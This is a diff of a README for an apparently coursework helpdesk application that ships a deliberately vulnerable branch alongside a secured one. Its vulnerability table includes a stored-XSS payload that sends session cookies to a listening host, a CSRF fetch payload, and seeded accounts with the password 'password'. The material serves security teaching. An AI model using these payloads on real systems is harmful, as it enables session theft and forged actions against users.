@@ -2,7 +2,7 @@
 
 A full-stack **ticketing / helpdesk** web application for managing support requests, users, and staff workflows. It is built for the **National College of Ireland — Secure Web Development** module: the **primary security focus** is applying **defence in depth** across authentication, session handling, authorization, input/output handling, CSRF protection, safe database access, and operational audit logging.
 
-**Stack:** Vue 3 + TypeScript (SPA) + Tailwind CSS, Golang (Gin) REST API, MySQL (GORM, Goose), PASETO-based sessions tokens in **HttpOnly** cookies, **Argon2id** password hashing, **zerolog** structured logging. **Notification** used Mailpit Local Mail Server
+**Stack:** Vue 3 + TypeScript (SPA) + Tailwind CSS, Golang (Gin) REST API, MySQL (GORM, Goose), PASETO-based sessions tokens in **HttpOnly** cookies, **Argon2id** password hashing, **zerolog** structured logging. Email **Notification** used Mailpit Test Mail Server
 
 ---
 
@@ -79,7 +79,7 @@ helpdesk/
 
 ### Production deployment
 
-The hosted environment runs **Docker** on **EC2**, with **GitHub Actions** building images and deploying on push to `vulnerable-baseline` or `secure-fix`. Configuration, networking, server layout, and GitHub/AWS expectations are documented here:
+The hosted environment runs **Docker** on **EC2** orchestrated by [docker compose](deploy/secure/docker-compose.yml), with **GitHub Actions** building images and deploying on push to `vulnerable-baseline` or `secure-fix`. Configuration, networking, server layout, and GitHub/AWS expectations are documented here:
 
 **[deploy/README.md](deploy/README.md)**
 
@@ -87,10 +87,10 @@ Production URLs (HTTPS, as wired in this repo and the reverse proxy):
 
 | Resource | URL |
 |----------|-----|
-| Vulnerable (Insecure UI) | http://vulnweb.chisomejim.site |
-| Vulnerable (Insecure API) | http://api.vulnweb.chisomejim.site |
-| Secure (UI) | https://secweb.chisomejim.site |
-| Secure (API) | https://api.secweb.chisomejim.site |
+| Vulnerable (Insecure UI HTTP) | http://vulnweb.chisomejim.site |
+| Vulnerable (Insecure API HTTP) | http://api.vulnweb.chisomejim.site |
+| Secure (UI HTTPS) | https://secweb.chisomejim.site |
+| Secure (API HTTPS) | https://api.secweb.chisomejim.site |
 | Mail (Mailpit web UI) | https://mail.chisomejim.site |
 
 ---
@@ -114,8 +114,8 @@ Secure Branch: `secure_helpdesk`
 
 ```sql
 CREATE DATABASE secure_helpdesk CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
-CREATE USER 'secure_helpdesk'@'localhost' IDENTIFIED BY 'your_password';
-GRANT ALL ON helpdesk.* TO 'helpdesk'@'localhost';
+CREATE USER 'admin'@'localhost' IDENTIFIED BY 'your_password';
+GRANT ALL ON secure_helpdesk.* TO 'admin'@'localhost';
 FLUSH PRIVILEGES;
 ```
 
@@ -160,7 +160,7 @@ Open the URL printed by Vite (typically `http://localhost:3000`).
 
 ## Usage guidelines
 
-1. **Register / log in** — login through /login in the UI e.g http://127.0.0.1:3000/login. If you set `SEED_CA` to true, then use customer account `mark.anthony@company-a.com` or a staff account `cassey.admin@secweb.ie` to login, both with `password` as password. Or you can just signup.
+1. **Register / log in** — login through /login in the UI e.g http://127.0.0.1:3000/login. If you set `SEED_CA` to true, then use customer account `mark.anthony@company-a.com` or a staff account `cassey.admin@secweb.ie` to login, both with password as `password`. Or you can just signup.
 2. **Tickets** — Create a ticket from the dashboard; open a ticket to view details, status, assignment, and comments.
 3. **Search** — Use ticket search; the server must bind search parameters safely (no raw string concatenation into SQL).
 4. **Profile & sessions** — Update profile where allowed; review and revoke other sessions from the sessions view.
@@ -178,8 +178,8 @@ The project follows a structured vulnerability and remediation plan **VULN-01 �
 |----|-------|------|-------------------------|
 | **VULN-01** | Session cookie flags | Tokens readable by JS or sent over HTTP | Session cookies **`HttpOnly=false`**, **`Secure=false`**, exposing tokens to script access, insecure transport. |
 | **VULN-02** | IDOR | Access other users’ profiles or tickets by ID | Clients may reference guessable resource IDs; the API does not enforce **ownership or role** before returning or mutating another user’s profile or ticket. |
-| **VULN-03** | Stored XSS | User content executed as HTML | Ticket or comment text is rendered as **HTML** in the UI (**v-html**) or passed unsafely into templates, allowing **stored script** execution in victims’ browsers e.g `<img src=x onerror="new Image().src='http://127.0.0.1:3333/?c='+encodeURIComponent(document.cookie)">` |
-| **VULN-04** | CSRF | Cross-site form posts mutate state | State-changing requests accept **session cookies** without a **bound anti-CSRF token** to the session, allowing malicious sites to trigger actions with invalid csrf tokens. e.g `<img src=x onerror='fetch("http://127.0.0.1:5000/api/tickets/4",{method:"PATCH",credentials:"include",headers:{"Content-Type":"application/json","X-CSRF-Token":"invalid-xxx"},body:JSON.stringify({description:"You have been pwned."})})'` |
+| **VULN-03** | Stored XSS | User content executed as HTML | Ticket or comment text is rendered as **HTML** in the UI (**v-html**) or passed unsafely into templates, allowing **stored script** execution in victims’ browsers e.g `<img src=x onerror="new Image().src='http://127.0.0.1:3333/?c='+encodeURIComponent(document.cookie)">`. Run `python3 -m http.server 3333` locally to listen for the token|
+| **VULN-04** | CSRF | Cross-site form posts mutate state | State-changing requests accept **session cookies** without a **bound anti-CSRF token** to the session, allowing malicious sites to trigger actions with invalid csrf tokens. e.g `<img src=x onerror='fetch("http://127.0.0.1:8080/api/tickets/4",{method:"PATCH",credentials:"include",headers:{"Content-Type":"application/json","X-CSRF-Token":"invalid-xxx"},body:JSON.stringify({description:"You have been pwned."})})'` |
 | **VULN-05** | Weak audit trail | No forensic trail for incidents | Sensitive actions may leave **no footprint** of actor, action, and outcome, hindering detection, incident review and non-repudiation. |
 | **VULN-06** | SQL injection (search) | Search query concatenated into raw SQL | User search input may be **concatenated into SQL strings**, allowing **injection** and unintended data access or modification. |
 
